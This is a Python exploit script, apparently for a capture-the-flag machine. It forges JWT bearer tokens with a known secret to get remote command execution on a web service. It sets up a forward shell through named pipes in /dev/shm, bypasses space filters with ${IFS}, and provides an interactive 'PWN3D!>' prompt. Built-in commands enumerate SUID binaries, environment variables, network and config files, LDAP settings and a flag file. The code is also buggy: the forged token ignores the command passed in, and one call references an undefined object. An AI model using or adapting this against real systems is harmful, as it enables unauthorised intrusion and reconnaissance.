#!/usr/bin/env python3

import base64
import random
import requests
import threading
import time
from colorama import *
import jwt

#Global Variables Like Url's And proxies
global url
global proxies
url = 'http://IP/' #CHANGE ME
proxies = {"http": "http://127.0.0.1:8080"}

class exploit(object):

	def __init__(self, interval=1.3):
		session = random.randrange(10000,99999)
		self.stdin = f'/dev/shm/input.{session}'
		self.stdout = f'/dev/shm/output.{session}'
		self.interval = interval
		print(Fore.LIGHTGREEN_EX + "Setting Up Tty Shell")
		MakeNamedPipes = f"mkfifo {self.stdin}; tail -f {self.stdin} | /bin/sh 2>&1 > {self.stdout}"
		self.request(MakeNamedPipes, timeout=20)
		print(Fore.LIGHTGREEN_EX + "Setting Up Read Thread")
		self.interval = interval
		thread = threading.Thread(target=self.ReadThread, args=())
		thread.daemon = True
		thread.start()

	def jwt_forge(self, cmd):
		space = "${IFS}"
		b64cmd = base64.b64encode('{}\n'.format(cmd.rstrip()).encode('utf-8')).decode('utf-8')
		test = f"/bin/sh{space}2>&1{space}>{space}{self.stdout}{space}>(mkfifo{space}{self.stdin};{space}tail{space}-f{space}{self.stdin})"
		jwt_data = {"cmd": f"bash{space}-c{space}/bin/sh{space}2>&1{space}>{space}{self.stdout}{space}>(mkfifo{space}{self.stdin};{space}tail{space}-f{space}{self.stdin})"}
		secret = 'JWT_SECRET'   #CHANGE ME
		token = jwt.encode(payload=jwt_data, key=secret)
		return token

	def help(self):
		print(Fore.YELLOW + "Custom Commands:\n")

		print(Fore.LIGHTRED_EX + "sysinfo\n")
		print(Fore.LIGHTRED_EX + "getsuid\n")
		print(Fore.LIGHTRED_EX + "getflag\n")
		print(Fore.LIGHTRED_EX + "LinEnum\n")


	def ReadThread(self):
		GetOutput = f"cat {self.stdout}"
		while True:
			result = self.request(GetOutput, timeout=20)
			if result:
				print(result)
				ClearOutput = f'echo -n "" > {self.stdout}'
				self.request(ClearOutput, timeout=20)
			time.sleep(self.interval)	


	

	def request(self, cmd, timeout):
		url = 'http://172.16.1.22:3000/'
		token = self.jwt_forge(cmd)
		headers = {"authorization": f"Bearer {token}"}
		r = requests.get(url, headers=headers, proxies=proxies, timeout=timeout)
		if len(r.text) == 0:
			print(Fore.LIGHTRED_EX + "The Command Is Not Found Or You Messed Something Up!\n")
		else:	
			print(r.text)

	
	def run_cmd(self, cmd):
		print(Fore.LIGHTGREEN_EX + f"Running Command: {cmd}")
		self.request(cmd)

	def upgrade(self):
		 UpgradeShell = """python3 -c 'import pty; pty.spawn("/bin/bash")' || python -c 'import pty; pty.spawn("/bin/bash")' || script -qc /bin/bash /dev/null"""	


term = Fore.LIGHTGREEN_EX + "PWN3D!> "
S = exploit()
while True:
	stdin = input(term)
	cmd = stdin.replace(' ', "${IFS}")
	if stdin == "help":
		S.help()
	elif stdin == "sysinfo":
		sinfo = 'uname -a'
		filter_sinfo = sinfo.replace(' ', '${IFS}')
		S.request(filter_sinfo, timeout=20)

	elif stdin == "getsuid":
		suid = 'find / -perm -4000'
		fsuid = suid.replace(' ', '${IFS}')
		S.request(fsuid)
	elif stdin == "getflag":
		flag = 'cat /home/USER/Desktop/flag.txt'     #CHANGE ME
		fflag = flag.replace(' ', '${IFS}')
		S.request(fflag, timeout=20)
	elif stdin == "LinEnum" or stdin == "linenum":
		systemstats = "df${IFS}-h${IFS}&&${IFS}lsblk"
		print(Fore.LIGHTRED_EX + "Enumerating System Stats\n")
		S.request(systemstats, timeout=20)
		software = 'which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl'
		fsoftware = software.replace(' ', '${IFS}')
		print(Fore.LIGHTRED_EX + "Useful Software\n")
		S.request(fsoftware, timeout=20)
		envprint = 'printenv'
		print(Fore.LIGHTRED_EX + "Getting Environment Info\n")
		S.request(envprint, timeout=20)
		psenum = 'ps${IFS}-aux'
		print(Fore.LIGHTRED_EX + "Enumerating Processes\n")
		S.request(psenum, timeout=20)
		enumcpu = 'lscpu'
		print(Fore.LIGHTRED_EX + "Getting Cpu Info\n")
		S.request(enumcpu)
		optenum = 'ls${IFS}-la${IFS}/opt/'
		print(Fore.LIGHTRED_EX + "Interesting In /opt\n")
		S.request(optenum, timeout=20)
		hostenum = 'cat /etc/hostname /etc/hosts /etc/resolv.conf && ip a && ip n'
		fhostenum = hostenum.replace(' ', '${IFS}')
		print(Fore.LIGHTRED_EX + "Gathering Network Info\n")
		S.request(fhostenum, timeout=20)
		configenum = 'find / -name *.conf'
		fconfigenum = configenum.replace(' ', '${IFS}')
		print(Fore.LIGHTRED_EX + "Enumerating Config Files\n")
		S.request(fconfigenum, timeout=20)
		ldapenum = 'cat${IFS}/etc/ldap/ldap.conf'
		print(Fore.LIGHTRED_EX + "Enumerating Ldap")
		S.request(ldapenum, timeout=20)
		homedirenum = 'ls -la /home/joe/'
		fhomedirenum = homedirenum.replace(' ', '${IFS}')
		print(Fore.LIGHTRED_EX + "Files In Users Home Directory")
		S.request(fhomedirenum, timeout=20)
		capenum = 'getcap${IFS}/${IFS}-r'
		print(Fore.LIGHTRED_EX + "Enumerating Capabillitys")
		S.request(capenum, timeout=20)
	elif cmd.startswith('upgrade') or cmd.startswith('Upgrade'):
		fs.upgrade()					
	
	else:	
		S.request(cmd, timeout=20)
	

